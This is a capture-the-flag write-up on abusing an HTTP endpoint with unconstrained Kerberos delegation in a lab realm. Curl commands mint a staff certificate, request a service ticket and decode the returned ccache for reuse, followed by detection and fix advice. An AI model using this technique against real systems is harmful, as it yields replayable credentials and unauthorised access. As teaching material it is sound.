# K19.3 — The archive delegates

> **Category:** 2. KeplerOps · **Points:** 400 · **Difficulty:** expert
> **Solved by:** me (manual)

## At a glance

| | |
|---|---|
| **Vulnerability / bug class** | Unconstrained Kerberos delegation exposed over HTTP — any certificate the archive accepts can request a staff service ticket, and the archive serialises the ccache back to the caller |
| **Tools** | `curl`, `base64`, `klist`, `KRB5CCNAME` |
| **Attack surface** | `POST https://staff.keplerops.test/api/archive/delegation/probe` over mTLS |
| **Prerequisite** | A valid `clientAuth` certificate for an `@keplerops.test` UPN (K19.1) |
| **Flag** | accepted, value not recorded |

**What you are about to read:** how a "probe" endpoint meant to test delegation became a Kerberos
ticket factory, why a ccache in a JSON response is worse than a password, and where delegation stops.

## Objective

> Use the colleague's archive workflow to establish the delegated authentication context needed by
> supplier administration.

Supplier administration wants a service ticket for `HTTP/staff.keplerops.test@KEPLEROPS.TEST`; we
hold no realm password, only a minted certificate. The card converts one into the other.

## Background you need

**Delegation.** A service acting with the *user's* authority toward another service needs a ticket
for that target. Unconstrained delegation allows **any** SPN; constrained delegation
(S4U2Self/S4U2Proxy) is an allow-list; RBCD is one target with an explicit ACL. Unconstrained means
the service — or anyone who can make it act — mints a ticket for any service in the realm on the
victim's behalf. No password, no domain-joined host: only a way to *ask*.

**ccache.** A credential cache holds the TGT and service tickets obtained; a base64 blob of one is a
portable, replayable credential — a session cookie valid for every service the tickets cover.

## Walkthrough

### 1. Get a certificate the archive will accept

Enrollment (K19.1) returns a keypair for any `@keplerops.test` UPN; `certificate_pem` goes to
`evan.crt`, `private_key_pem` to `evan.key`:

```bash
curl -sS -k -X POST \
  -H 'Authorization: Bearer fk_cert_enrollment_Um9U1sNZQ5b_Cb08iirD4H-BKfz8aMF9' \
  -H 'Content-Type: application/json' -d '{"upn":"evan.calderoux@keplerops.test"}' \
  https://staff.keplerops.test/api/enrollment/StaffArchiveUser/requests | jq
```

### 2. Ask the delegation surface for the staff SPN

```bash
curl -sS -k --cert evan.crt --key evan.key -H 'Content-Type: application/json' \
  -d '{"spn":"HTTP/staff.keplerops.test@KEPLEROPS.TEST"}' \
  https://staff.keplerops.test/api/archive/delegation/probe
```

The response carries a base64 **ccache** and this card's flag (`{"spn": …, "ccache_base64": …,
"flag": …}`).

### 3. Materialise and inspect the ticket

```bash
jq -r .ccache_base64 probe.json | base64 -d > /tmp/evan.ccache
KRB5CCNAME=FILE:/tmp/evan.ccache klist
```

`klist` shows principal `evan.calderoux@KEPLEROPS.TEST` with `krbtgt/KEPLEROPS.TEST` and
`HTTP/staff.keplerops.test` — a TGT and one service ticket, for staff only. That is the delegated
authentication context this card asks for.

### 4. Getting the flag, and finding the edge

The probe's `flag` field is this card's value; the card stores none, so it is accepted/not recorded.
The engineering result is the *edge* of the delegation: `HTTP/connector.arwc.test`,
`HTTP/cloud-api.keplerops.test` and `HTTP/workloads.keplerops.test` all return
`{"error":"ticket_request_failed"}` — only the staff SPN exists. Presenting the ccache to the customer
side fails too:

`curl -sS -k --negotiate -u : https://connector.arwc.test/api/fieldlink/diagnostics` returns
`403 {"error":"channel_identity_denied"}`, as do staff mTLS certificates: the ARWC ingress wants a
customer-side channel identity, not a KeplerOps staff principal.

## Why this works (the vulnerability explained)

Two layers are confused.

**HTTP authorisation:** the probe authenticates the caller by certificate subject, then authorises on
"is this an archive principal". That subject came from an issuance policy that signs anything
(K19.1), so the check reduces to "does the caller hold a certificate we minted".

**Kerberos:** past layer 1 the service uses its own realm identity to request a ticket *for the
caller*; with unconstrained delegation the KDC issues any SPN the service names, and the probe
serialises the ccache and returns it.

`worker token -> UPN cert -> mTLS -> ask for SPN -> KDC issues ticket -> ccache in JSON -> you own it`

The response is the bug. Delegation is a server-side act; materialising a ccache and handing it to
the requester turns an authorisation decision into a transferable credential, and even constrained
delegation is unsafe if the token is returned instead of used in-process. Correct design: never
return a ccache, allow-list the SPNs, tie the probe to the authenticated principal and an authorised
target, and clear `TRUSTED_TO_AUTH_FOR_DELEGATION` where it is not needed.

## Detection and fix

- **Log signal:** TGS-REQ (4769) for `HTTP/staff.keplerops.test` where the requesting account is the
  archive service but the "for user" principal is many different UPNs; delegation-probe calls from
  certificates enrolled minutes earlier.
- **Fix:** no ccache in responses, constrained delegation with an SPN allow-list, role-gated endpoint.
  A ccache cannot be recalled — only expiry and key rotation reduce the blast radius.

## Notes and dead ends

- The response key `ccache_base64` is reconstructed; what is recorded is the base64 ccache plus flag,
  usable via `KRB5CCNAME=FILE:/tmp/evan.ccache klist`.
- `ticket_request_failed` for every non-staff SPN is the boundary of this card.
- A non-realm subject at enrollment returns `422 invalid_upn`; the realm boundary limits supply.
